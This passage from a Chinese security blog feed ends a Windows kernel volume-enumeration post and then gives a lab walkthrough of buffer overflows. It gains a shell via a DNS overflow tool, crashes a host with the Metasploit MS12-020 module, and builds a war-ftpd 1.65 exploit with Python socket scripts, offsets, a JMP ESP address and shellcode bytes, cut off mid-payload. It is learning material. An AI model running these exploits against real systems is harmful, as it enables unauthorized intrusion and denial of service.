class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        Status = <span class="built_in">ZwCreateFile</span>(</span><br><span class="line">            &amp;VolumeHandle,</span><br><span class="line">            SYNCHRONIZE | FILE_ANY_ACCESS,</span><br><span class="line">            &amp;ObjectAttributes,</span><br><span class="line">            &amp;IoStatusBlock,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">            FILE_OPEN,</span><br><span class="line">            FILE_SYNCHRONOUS_IO_NONALERT | FILE_DIRECTORY_FILE,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status) == FALSE)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        ObjectNameInfoLength = BUFFER_SIZE_MAX;</span><br><span class="line">        Status = <span class="built_in">ZwQueryObject</span>(VolumeHandle, <span class="number">1</span>, ObjectNameInfo, ObjectNameInfoLength,</span><br><span class="line">            &amp;ObjectNameInfoLength);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status) == TRUE)</span><br><span class="line">            <span class="built_in">AddVolumeInfo</span>(VolumeHandle, <span class="string">L&#x27;A&#x27;</span> + i, &amp;ObjectNameInfo-&gt;Name);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">ZwClose</span>(VolumeHandle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ObjectNameInfo != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">FreeBufferToLookAsideList</span>(ObjectNameInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解析卷信息"><a href="#解析卷信息" class="headerlink" title="解析卷信息"></a>解析卷信息</h2><p>ObReferenceObjectByHandle从句柄到对象，FileObject-&gt;DeviceObject-&gt;Vpb由文件对象获取Vpb，Vpb-&gt;DeviceObject获取Vpb对象，判断是否存在。</p><p>动态申请VOLUME_INFO结构，将各种信息放入，插入链表中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddVolumeInfo</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE VolumeHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    WCHAR  VolumeName,</span></span></span><br><span class="line"><span class="params"><span class="function">    UNICODE_STRING* DeviceName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    VOLUME_INFO* v5 = <span class="literal">NULL</span>;</span><br><span class="line">    FILE_OBJECT* FileObject = <span class="literal">NULL</span>;</span><br><span class="line">    PVPB           Vpb = <span class="literal">NULL</span>;</span><br><span class="line">    DEVICE_OBJECT* VpbDeviceObject = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    ULONG v7 = <span class="built_in">sizeof</span>(VOLUME_INFO) + (DeviceName-&gt;Length + <span class="number">1</span>) * <span class="built_in">sizeof</span>(WCHAR);</span><br><span class="line"></span><br><span class="line">    NTSTATUS Status = <span class="built_in">ObReferenceObjectByHandle</span>(VolumeHandle, </span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, KernelMode, (PVOID*)&amp;FileObject, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!FileObject || !FileObject-&gt;DeviceObject || !FileObject-&gt;DeviceObject-&gt;Vpb)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Vpb = FileObject-&gt;DeviceObject-&gt;Vpb;   <span class="comment">//卷参数块 (VPB) 结构用于将表示已装载的文件系统卷的设备对象映射到表示物理或虚拟磁盘设备的设备对象 https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_vpb</span></span><br><span class="line">    VpbDeviceObject = Vpb-&gt;DeviceObject;</span><br><span class="line">    <span class="keyword">if</span> (!VpbDeviceObject)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v5 = (VOLUME_INFO*)<span class="built_in">AllocateBuffer</span>(v7);</span><br><span class="line">    <span class="keyword">if</span> (v5 == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line">    v5-&gt;DeviceObject = FileObject-&gt;DeviceObject;</span><br><span class="line">    v5-&gt;VpbDeviceObject = VpbDeviceObject;</span><br><span class="line">    v5-&gt;VolumeName = VolumeName;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;v5-&gt;DeviceName[<span class="number">0</span>], DeviceName-&gt;Buffer, DeviceName-&gt;Length);</span><br><span class="line">    v5-&gt;Length = DeviceName-&gt;Length / <span class="built_in">sizeof</span>(WCHAR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExAcquireFastMutex</span>(&amp;__VolumeInfoLock);</span><br><span class="line">    <span class="built_in">InsertTailList</span>(&amp;__VolumeInfoList, &amp;v5-&gt;ListEntry);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExReleaseFastMutex</span>(&amp;__VolumeInfoLock);</span><br><span class="line">Exit:</span><br><span class="line">    <span class="built_in">ObDereferenceObject</span>(FileObject);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="释放卷信息"><a href="#释放卷信息" class="headerlink" title="释放卷信息"></a>释放卷信息</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">FreeVolumeInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  </span><br><span class="line">    VOLUME_INFO* v5 = <span class="literal">NULL</span>;</span><br><span class="line">    LIST_ENTRY* v1 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExAcquireFastMutex</span>(&amp;__VolumeInfoLock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsListEmpty</span>(&amp;__VolumeInfoList) == TRUE)</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">IsListEmpty</span>(&amp;__VolumeInfoList) == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = <span class="built_in">RemoveHeadList</span>(&amp;__VolumeInfoList);</span><br><span class="line">        <span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        v5 = <span class="built_in">CONTAINING_RECORD</span>(v1, VOLUME_INFO, ListEntry);</span><br><span class="line">        <span class="keyword">if</span> (v5 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">FreeBuffer</span>(v5);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line">    <span class="built_in">InitializeListHead</span>(&amp;__VolumeInfoList);</span><br><span class="line">    <span class="built_in">ExReleaseFastMutex</span>(&amp;__VolumeInfoLock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;获取卷信息&quot;&gt;&lt;a href=&quot;#获取卷信息&quot; class=&quot;headerlink&quot; title=&quot;获取卷信息&quot;&gt;&lt;/a&gt;获取卷信息&lt;/h1&gt;&lt;p&gt;使用内核链表和快速互斥体。&lt;/p&gt;
&lt;p&gt;快速互斥体不支持递归获取，也就是不允许自己线程重复获取。&lt;/p&gt;
&lt;p&gt;一</summary>
      
    
    
    
    <category term="Windows Kernel" scheme="https://qianmuoy.github.io/categories/Windows-Kernel/"/>
    
    
  </entry>
  
  <entry>
    <title>缓冲区溢出漏洞</title>
    <link href="https://qianmuoy.github.io/2024/03/09/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>https://qianmuoy.github.io/2024/03/09/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-03-09T12:34:05.000Z</published>
    <updated>2024-03-09T12:34:22.384Z</updated>
    
    <content type="html"><![CDATA[<h1 id="缓冲区溢出漏洞实战记录"><a href="#缓冲区溢出漏洞实战记录" class="headerlink" title="缓冲区溢出漏洞实战记录"></a>缓冲区溢出漏洞实战记录</h1><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p><strong>缓冲区溢出</strong></p><p>  缓冲区溢出是指当计算机向缓冲区内填充数据时超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。理想的情况是：程序检查数据长度并不允许输入超过缓冲区长度的字符，但是绝大多数程序都会假设数据长度总是与所分配的储存空间相匹配，这就为缓冲区溢出埋下了隐患。</p><p>  操作系统所使用的缓冲区，又被称为”堆栈”。在各个操作进程之间，指令会被临时储存在“堆栈”中，“堆栈”也会出现缓冲区溢出。</p><p>  缓冲区溢出的危害：在当前网络与分布式系统安全中，被广泛利用的50%以上都是缓冲区溢出，其中最著名的例子是1988年利用fingerd漏洞的蠕虫。而缓冲区溢出中，最为危险的是堆栈溢出，因为入侵者可以利用堆栈溢出，在函数返回时改变返回程序的地址，让其跳转到任意地址，带来的危害是：一种情况是程序崩溃导致拒绝服务，另外一种就是跳转并且执行一段恶意代码，比如得到shell，然后为所欲为。</p><p><strong>MS12-020漏洞</strong></p><p>  微软于2012年3月12日发布安全公告，公布了MS12-020漏洞，漏洞级别为<strong>严重</strong>，这个级别是微软所有漏洞级别的最高级别，意即会对服务和企业运营造成巨大损失。</p><p>  这个漏洞的定义是指操作系统的远程桌面协议存在重大漏洞，入侵者（黑客）可以通过向远程桌面默认端口（3389）发一系列特定RDP包，从而获取超级管理员权限，进而入侵系统。</p><p>  若该主机同时提供80端口服务，那么疑似有相对更大的隐患。</p><p>  根据微软的安全公告，Windows全系列操作系统（WinXP&#x2F;Vista&#x2F;Win7&#x2F;Win2000&#x2F; Win2003&#x2F;Win2008）均存在受控威胁。但因为远程桌面管理的特殊性，几乎所发现的主机都是服务器，PC机暂未发生。</p><h2 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*buffer.c</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> name[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(“Please input your name: ”);</span><br><span class="line"></span><br><span class="line"><span class="built_in">gets</span>(name);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(“your name is : %s!”, name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用溢出工具溢出目标系统，获取目标系统shell"><a href="#利用溢出工具溢出目标系统，获取目标系统shell" class="headerlink" title="利用溢出工具溢出目标系统，获取目标系统shell"></a>利用溢出工具溢出目标系统，获取目标系统shell</h2><p>DNS远程溢出的漏洞直接对主机进行溢出攻击，成功后一般会直接获得系统权限。如：Windows DNS API（CVE-2017-11779）</p><p>扫描靶机信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns -s ip</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208123245234.png" alt="image-20240208123245234"></p><p>找到目标端口1027。选中2003chs进行攻击。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns -t 2003chs 10.1.1.2 1027</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208123716348.png" alt="image-20240208123716348"></p><p>结果显示1100tcp端口被攻击。现在用telnet远程登陆上去。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.1.1.2 1100</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208123918829.png" alt="image-20240208123918829"></p><p>system32目录下，此时已是管理员权限。</p><h2 id="利用MS12-020漏洞溢出目标系统，使目标系统瘫痪"><a href="#利用MS12-020漏洞溢出目标系统，使目标系统瘫痪" class="headerlink" title="利用MS12-020漏洞溢出目标系统，使目标系统瘫痪"></a>利用MS12-020漏洞溢出目标系统，使目标系统瘫痪</h2><p>运行Metasploit，搜集目标主机的目标端口（3389）和其他信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap -sT -p3389  10.1.1.2</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208124537342.png" alt="image-20240208124537342"></p><p>搜索模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms12_020</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208124748108.png" alt="image-20240208124748108"></p><p>显示了位置。接下来进行利用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240208125200990.png" alt="image-20240208125200990"></p><p>根据提示设置参数。第二个参数已经被设置。设置好后，使用exploit命令利用。</p><p><img src="/.io//image-20240208125414865.png" alt="image-20240208125414865"></p><p>已瘫痪。无法ping通。</p><h1 id="缓冲区溢出调试"><a href="#缓冲区溢出调试" class="headerlink" title="缓冲区溢出调试"></a>缓冲区溢出调试</h1><h2 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h2><p>war-ftpd 1.65存在缓冲区溢出漏洞，当登录时用户名过长时就会发生缓冲区溢出，程序进而崩溃。本实验正是利用这一点使用调试工具cdb找出溢出时相应寄存器记录的地址，通过利用shellcode构造用户名字符串，使得war-ftpd程序接收此用户名时发生溢出进而执行shellcode，达到攻击目的。</p><h2 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h2><p>打开war-ftpd.exe，使用ollydbg attach到这个进程上。没有mona插件，后面都用Immunity Debugger继续调试。</p><p><img src="/.io//image-20240208140653599.png" alt="image-20240208140653599"></p><p>利用Immunity Debugger的mona插件来生成1000个字节。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pattern_create 1000</span><br></pre></td></tr></table></figure><p>命令执行后会在这个目下C:\Program Files\Immunity Inc\Immunity Debugger 生成pattern.txt，里面存放了1000 bytes的junkcode.</p><p><img src="/.io//image-20240208141409611.png" alt="image-20240208141409611"></p><p><strong>点击左上角的闪电，打开21端口。</strong></p><p>利用python编写一个Socket程序将这些字节赋值给username段，发送给var-ftpd使之溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成的1000个字节</span></span><br><span class="line">pattern =       <span class="string">&#x27;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#TCP流套接字</span></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立连接</span></span><br><span class="line">s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">21</span>))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;connect...&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在用户名处填充pattern</span></span><br><span class="line">s.send(<span class="string">&#x27;USER &#x27;</span>+pattern+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">&#x27;PASS &#x27;</span>+<span class="string">&#x27;123456&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;finish!&#x27;</span></span><br></pre></td></tr></table></figure><p>发送后，Immunity Debugger调试器跟踪如下：</p><p><img src="/.io//image-20240208144454773.png" alt="image-20240208144454773"></p><p><img src="/.io//image-20240208143841088.png" alt="image-20240208143841088"></p><p>ESP&#x3D;71413471，EIP&#x3D;32714131</p><p>现在计算这两个地址在1000字节字符串中的偏移地址，依旧使用mona插件。</p><p><img src="/.io//image-20240208144146800.png" alt="image-20240208144146800"></p><p><img src="/.io//image-20240208144156538.png" alt="image-20240208144156538"></p><p>可知EIP偏移为485，ESP偏移为493。这意味着485个字节后的EIP寄存器开始被缓冲区覆盖那么EIP中486-489字节是我们想要的目标。</p><p>CPU通过EIP寄存器中的值知道下一个要运行的指令，在内存地址中运行这些当前的指令，在EIP的内存位置中使用JMP ESP指令使CPU来执行指令和“跳”到ESP寄存器中执行驻留在该地址的内存中的指令。我们的目的就是在EIP中使用JMP ESP指令，这样我们就能控制执行命令并把我们的代码转变到ESP寄存器中。</p><p>两个寄存器之间有8个字节，于是我们用4个字节来填充我们的缓冲区，缩小间距和连接到ESP寄存器。我们使用保持1000字节边界的框架漏洞来调整缓冲区：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#Fuzz string</span></span><br><span class="line">pattern = <span class="string">&quot;\x41&quot;</span>*<span class="number">485</span> + <span class="string">&quot;\x42\x42\x42\x42&quot;</span> + <span class="string">&quot;\x43&quot;</span>*<span class="number">4</span> + <span class="string">&quot;\x44&quot;</span>*<span class="number">507</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#TCP流套接字</span></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立连接</span></span><br><span class="line">s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">21</span>))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;connect...&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在用户名处填充pattern</span></span><br><span class="line">s.send(<span class="string">&#x27;USER &#x27;</span>+pattern+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">&#x27;PASS &#x27;</span>+<span class="string">&#x27;123456&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;finish!&#x27;</span></span><br></pre></td></tr></table></figure><p>在Immunity debugger中重启FTP服务器，按播放键取消暂停的应用程序。</p><p>将更改后的程序运行，调试器跟踪如下:</p><p><img src="/.io//image-20240208144320345.png" alt="image-20240208144320345"></p><p>如预期一样，EIP存储了4个42，EIP到ESP间填充了4个43。得到ESP开始和结束的内存地址：start：00AEFD48 end：00AEFF3F。00AEFF3F-00AEFD48转换十进制后计算得知为487，意味着可以用487个字节来存放shellcode。</p><h2 id="构造ShellCode"><a href="#构造ShellCode" class="headerlink" title="构造ShellCode"></a>构造ShellCode</h2><p>现在，我们有了目标内存地址和指令，我们需要一种方法获得从EIP寄存器到ESP寄存器的指令，为了做到这一点，我们可以在windows操作系统的DLL中使用现有的JMP ESP指令。</p><p>单击Immunity debugger器的工具栏上的“e”，在存在的windows dll中查找JMP ESP指令，之后双击一个DLL，右键单击“搜索”，选择“command”，之后键入“JMP ESP”。在kernel32.dll系统文件中发现了我们要找的指令，然后记下JMP ESP的内存地址。</p><p><img src="/.io//image-20240208144428779.png" alt="image-20240208144428779"></p><p>EIP中包含JMP ESP的目标地址(7C86467B)和我们的CCs在ESP(00AEFD48)开始。现在，我们控制执行命令，剩下的就是用shellcode替换掉占位的CCs。</p><p>构造漏洞利用的登录用户名字符串，如下所示</p><p><img src="/.io//image-20240208144642011.png" alt="image-20240208144642011"></p><p>使用metasploit的msfpayload来创建payload。有一点要注意：因为我们传递的都是字符串，我们必须要遵守字符限制的FTP 协议。这就意味着没有空，返回，换行，或是@符号，他们用16进制的表示为\x00, \x0d, \x0a, 0×40。”\x40\xff\x3d\x20”可以阻止shellcode执行。</p><p><img src="/.io//image-20240208151654511.png" alt="image-20240208151654511"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&quot;\xbf\x4d\xd5\x02\xce\xdb\xc0\xd9\x74\x24\xf4\x58\x29\xc9&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xb1\x33\x31\x78\x15\x03\x78\x15\x83\xc0\x04\xe2\xb8\x29&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xea\x47\x42\xd2\xeb\x37\xcb\x37\xda\x65\xaf\x3c\x4f\xba&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xa4\x11\x7c\x31\xe8\x81\xf7\x37\x24\xa5\xb0\xf2\x12\x88&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x41\x33\x9a\x46\x81\x55\x66\x95\xd6\xb5\x57\x56\x2b\xb7&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\x90\x8b\xc4\xe5\x49\xc7\x77\x1a\xfe\x95\x4b\x1b\xd0\x91&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xf4\x63\x55\x65\x80\xd9\x54\xb6\x39\x55\x1e\x2e\x31\x31&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;\xbe\x4f\x96\x21\x82\x06\x93\x92\x71\x99\x75\xeb\x7a\xab&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode+=<span 